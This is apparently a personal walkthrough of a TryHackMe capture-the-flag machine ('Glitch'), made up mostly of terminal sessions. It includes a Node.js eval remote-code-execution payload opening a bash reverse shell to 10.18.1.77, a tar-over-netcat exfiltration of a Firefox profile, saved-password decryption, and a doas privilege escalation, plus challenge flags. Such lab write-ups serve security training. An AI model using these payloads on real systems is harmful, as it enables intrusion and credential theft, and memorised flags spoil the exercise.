---
Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?
---

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/baebc18318f328bf978120cde5328cb0.jpeg)


![|222](https://media1.tenor.com/images/024701d4b264527abf5af72f1876102e/tenor.gif?itemid=15049093)

Warning! The box contains blinking images and sensitive words.

This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. Feedback is always appreciated.

*Note: It might take a few minutes for the web server to actually start.

```
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ sudo rustscan -a 10.10.147.59       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.147.59:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 20:16 EDT
Initiating Ping Scan at 20:16
Scanning 10.10.147.59 [4 ports]
Completed Ping Scan at 20:16, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:16
Completed Parallel DNS resolution of 1 host. at 20:16, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:16
Scanning 10.10.147.59 [1 port]
Discovered open port 80/tcp on 10.10.147.59
Completed SYN Stealth Scan at 20:16, 0.25s elapsed (1 total ports)
Nmap scan report for 10.10.147.59
Host is up, received echo-reply ttl 63 (0.19s latency).
Scanned at 2022-09-23 20:16:07 EDT for 1s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)



<body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>

ip/api/access

http://10.10.147.59/api/access

token	"dGhpc19pc19ub3RfcmVhbA=="

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ echo 'dGhpc19pc19ub3RfcmVhbA==' | base64 -d                               
this_is_not_real   

```

What is your access token?
*this_is_not_real*

```
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ feroxbuster --url http://10.10.147.59/api -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.147.59/api
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        1w       36c http://10.10.147.59/api/access
200      GET        1l        1w      169c http://10.10.147.59/api/items
[####################] - 16s     4614/4614    0s      found:2       errors:0      
[####################] - 16s     4614/4614    285/s   http://10.10.147.59/api 


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ curl -XPOST http://10.10.147.59/api/items 
{"message":"there_is_a_glitch_in_the_matrix"} 

There must be a missing parameter. Let’s fuzz it: 

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ wfuzz -X POST -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hh=45 http://10.10.147.59/api/items?FUZZ=oops
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.147.59/api/items?FUZZ=oops
Total requests: 475254

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                   
=====================================================================

000002370:   500        10 L     64 W       1081 Ch     "cmd" 

     -c: flag is used to show the output in colors

    · -z: to specify the payload list.

    · — hh 45: When we sent the POST request through burp, we saw that the content length of the “matrix message” was 45. In order to not show anymore this response, I put –hh 45. Basically here, wfuzz will hide all responses containing 45 characters. Indeed, this matrix message doesn’t have any value for us.

    · -u: the url that you need to fuzz.



└─$ curl -XPOST http://10.10.147.59/api/items?cmd=id
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: id is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>

https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ curl -XPOST "http://10.10.147.59/api/items?cmd=process.cwd()"
vulnerability_exploited /var/web 

require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.18.1.77/4444+0>%261"')

add this with burpsuite

do intercept to it then change get for post and add require...

POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.18.1.77/4444+0>%261"') HTTP/1.1

forward

and before start a revshell

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444                                    
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.147.59.
Ncat: Connection from 10.10.147.59:45602.
bash: cannot set terminal process group (1335): Inappropriate ioctl for device
bash: no job control in this shell
user@ubuntu:/var/web$ cd /home
cd /home
user@ubuntu:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root root 4096 Jan 15  2021 .
drwxr-xr-x 24 root root 4096 Jan 27  2021 ..
drwxr-xr-x  8 user user 4096 Jan 27  2021 user
drwxr-xr-x  2 v0id v0id 4096 Jan 21  2021 v0id
user@ubuntu:/home$ cd user
cd user
user@ubuntu:~$ ls
ls
user.txt
user@ubuntu:~$ cat user.txt
cat user.txt
THM{i_don't_know_why}

The basic goal of an API is to communicate with another application. In order, to receive an information we use the method GET. However, if we want to send an information, we will use POST method.


```



What is the content of user.txt?
What other methods does the API accept?
*THM{i_don't_know_why}*

```
lateral move

user@ubuntu:~$ ll
ll
total 48
drwxr-xr-x   8 user user  4096 Jan 27  2021 ./
drwxr-xr-x   4 root root  4096 Jan 15  2021 ../
lrwxrwxrwx   1 root root     9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4  2021 .cache/
drwxrwxrwx   4 user user  4096 Jan 27  2021 .firefox/
drwx------   3 user user  4096 Jan  4  2021 .gnupg/
drwxr-xr-x 270 user user 12288 Jan  4  2021 .npm/
drwxrwxr-x   5 user user  4096 Sep 24 00:09 .pm2/
drwx------   2 user user  4096 Jan 21  2021 .ssh/
-rw-rw-r--   1 user user    22 Jan  4  2021 user.txt
user@ubuntu:~$ tar cf - .firefox/ | nc 10.18.1.77 1234


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ nc -lvnp 1234 > firefox.tar
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.147.59.
Ncat: Connection from 10.10.147.59:52408.
ls
^C
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ ls            
firefox.tar


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ tar xvf firefox.tar 
.firefox/
.firefox/profiles.ini
.firefox/Crash Reports/
.firefox/Crash Reports/events/
.firefox/Crash Reports/InstallTime20200720193547
.firefox/b5w4643p.default-release/
.firefox/b5w4643p.default-release/key4.db
.firefox/b5w4643p.default-release/cookies.sqlite
.firefox/b5w4643p.default-release/prefs.js
.firefox/b5w4643p.default-release/addons.json
.firefox/b5w4643p.default-release/datareporting/
.firefox/b5w4643p.default-release/datareporting/session-state.json
.firefox/b5w4643p.default-release/datareporting/state.json
.firefox/b5w4643p.default-release/datareporting/archived/
.firefox/b5w4643p.default-release/datareporting/archived/2021-01/
.firefox/b5w4643p.default-release/datareporting/archived/2021-01/1610646005485.517da861-6cac-41c0-9300-cd37f0f003b6.new-profile.jsonlz4
.firefox/b5w4643p.default-release/datareporting/archived/2021-01/1610646005530.f02047cc-091e-4669-a33c-c416de325934.first-shutdown.jsonlz4
.firefox/b5w4643p.default-release/datareporting/archived/2021-01/1610646005498.cb6a868a-1a8a-4899-aa42-45ea34b70dfc.event.jsonlz4
.firefox/b5w4643p.default-release/datareporting/archived/2021-01/1610646005523.9f15d933-8005-4625-800b-8937d309c193.main.jsonlz4
.firefox/b5w4643p.default-release/AlternateServices.txt
.firefox/b5w4643p.default-release/shield-preference-experiments.json
.firefox/b5w4643p.default-release/logins.json
.firefox/b5w4643p.default-release/extension-preferences.json
.firefox/b5w4643p.default-release/.parentlock
.firefox/b5w4643p.default-release/security_state/
.firefox/b5w4643p.default-release/search.json.mozlz4
.firefox/b5w4643p.default-release/content-prefs.sqlite
.firefox/b5w4643p.default-release/compatibility.ini
.firefox/b5w4643p.default-release/extensions/
.firefox/b5w4643p.default-release/xulstore.json
.firefox/b5w4643p.default-release/webappsstore.sqlite
.firefox/b5w4643p.default-release/SiteSecurityServiceState.txt
.firefox/b5w4643p.default-release/favicons.sqlite
.firefox/b5w4643p.default-release/crashes/
.firefox/b5w4643p.default-release/crashes/store.json.mozlz4
.firefox/b5w4643p.default-release/crashes/events/
.firefox/b5w4643p.default-release/minidumps/
.firefox/b5w4643p.default-release/bookmarkbackups/
.firefox/b5w4643p.default-release/storage/
.firefox/b5w4643p.default-release/storage/permanent/
.firefox/b5w4643p.default-release/storage/permanent/chrome/
.firefox/b5w4643p.default-release/storage/permanent/chrome/.metadata-v2
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.files/
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.files/
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.files/
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/3561288849sdhlie.files/
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/2918063365piupsah.files/
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.files/
.firefox/b5w4643p.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite
.firefox/b5w4643p.default-release/storage/default/
.firefox/b5w4643p.default-release/storage/default/moz-extension+++5d902e6c-e1aa-472c-96a3-8c8b3986e36f^userContextId=4294967295/
.firefox/b5w4643p.default-release/storage/default/moz-extension+++5d902e6c-e1aa-472c-96a3-8c8b3986e36f^userContextId=4294967295/.metadata-v2
.firefox/b5w4643p.default-release/storage/default/moz-extension+++5d902e6c-e1aa-472c-96a3-8c8b3986e36f^userContextId=4294967295/idb/
.firefox/b5w4643p.default-release/storage/default/moz-extension+++5d902e6c-e1aa-472c-96a3-8c8b3986e36f^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.files/
.firefox/b5w4643p.default-release/storage/default/moz-extension+++5d902e6c-e1aa-472c-96a3-8c8b3986e36f^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite
.firefox/b5w4643p.default-release/storage/temporary/
.firefox/b5w4643p.default-release/sessionstore-backups/
.firefox/b5w4643p.default-release/saved-telemetry-pings/
.firefox/b5w4643p.default-release/saved-telemetry-pings/9f15d933-8005-4625-800b-8937d309c193
.firefox/b5w4643p.default-release/saved-telemetry-pings/cb6a868a-1a8a-4899-aa42-45ea34b70dfc
.firefox/b5w4643p.default-release/saved-telemetry-pings/f02047cc-091e-4669-a33c-c416de325934
.firefox/b5w4643p.default-release/saved-telemetry-pings/517da861-6cac-41c0-9300-cd37f0f003b6
.firefox/b5w4643p.default-release/sessionCheckpoints.json
.firefox/b5w4643p.default-release/pkcs11.txt
.firefox/b5w4643p.default-release/sessionstore.jsonlz4
.firefox/b5w4643p.default-release/protections.sqlite
.firefox/b5w4643p.default-release/storage.sqlite
.firefox/b5w4643p.default-release/permissions.sqlite
.firefox/b5w4643p.default-release/TRRBlacklist.txt
.firefox/b5w4643p.default-release/handlers.json
.firefox/b5w4643p.default-release/extensions.json
.firefox/b5w4643p.default-release/times.json
.firefox/b5w4643p.default-release/lock
.firefox/b5w4643p.default-release/SecurityPreloadState.txt
.firefox/b5w4643p.default-release/places.sqlite
.firefox/b5w4643p.default-release/addonStartup.json.lz4
.firefox/b5w4643p.default-release/cert9.db
.firefox/b5w4643p.default-release/containers.json
.firefox/b5w4643p.default-release/formhistory.sqlite


In order to find all the hidden information in this directory, we can use a script created by unode 

https://github.com/unode/firefox_decrypt

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch/.firefox]
└─$ cd ..      
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ sudo git clone https://github.com/unode/firefox_decrypt.git
[sudo] password for kali: 
Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1146, done.
remote: Counting objects: 100% (265/265), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 1146 (delta 248), reused 234 (delta 234), pack-reused 881
Receiving objects: 100% (1146/1146), 407.91 KiB | 1.21 MiB/s, done.
Resolving deltas: 100% (722/722), done.
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ ls    
firefox_decrypt  firefox.tar
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch]
└─$ cd firefox_decrypt  
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch/firefox_decrypt]
└─$ ls
AUTHORS  CHANGELOG.md  firefox_decrypt.py  LICENSE  README.md  tests
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/glitch/firefox_decrypt]
└─$ python3 firefox_decrypt.py ../.firefox/b5w4643p.default-release 
2022-09-23 21:00:37,838 - WARNING - profile.ini not found in ../.firefox/b5w4643p.default-release
2022-09-23 21:00:37,839 - WARNING - Continuing and assuming '../.firefox/b5w4643p.default-release' is a profile location

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'

user@ubuntu:~$ pwd
pwd
/home/user
user@ubuntu:~$ cd ..
cd ..
user@ubuntu:/home$ ll
ll
total 16
drwxr-xr-x  4 root root 4096 Jan 15  2021 ./
drwxr-xr-x 24 root root 4096 Jan 27  2021 ../
drwxr-xr-x  8 user user 4096 Jan 27  2021 user/
drwxr-xr-x  2 v0id v0id 4096 Jan 21  2021 v0id/
user@ubuntu:/home$ su v0id
su v0id
su: must be run from a terminal
user@ubuntu:/home$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"
user@ubuntu:/home$ su v0id
su v0id
Password: love_the_void

v0id@ubuntu:/home$ id
id
uid=1001(v0id) gid=1001(v0id) groups=1001(v0id)
v0id@ubuntu:/home$ sudo -l
sudo -l
[sudo] password for v0id: love_the_void

Sorry, user v0id may not run sudo on ubuntu.

v0id@ubuntu:/home$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas


Sudo Is Bloat. Use Doas Instead => [Link](https://www.youtube.com/watch?v=A5buxcYXp7k)

Basically, doas is a kind of sudo. As we want to have a root shell, we need to execute a command like: sudo -u root /bin/bash. However, if you try with sudo, it doesn’t work.

v0id@ubuntu:/home$ doas -u root /bin/bash
doas -u root /bin/bash
Password: love_the_void

root@ubuntu:/home# cd /root
cd /root
root@ubuntu:~# ls
ls
clean.sh  root.txt
root@ubuntu:~# cat root.txt
cat root.txt
THM{diamonds_break_our_aching_minds}



    · Find information in JavaScript code
      
    · How API works
     
    · Fuzz an URL with wfuzz
     
    · RCE through NodeJS
     
    · Find passwords hidden on Firefox folder.
     
    · Another alternative for sudo (doas)

root@ubuntu:~# cat clean.sh
cat clean.sh
#!/bin/bash

for CLEAN in $(find /var/log -type f)
do
        cp /dev/null $CLEAN
done


```



What is the content of root.txt?
My friend says that sudo is bloat.
*THM{diamonds_break_our_aching_minds}*



[[Smag Grotto]]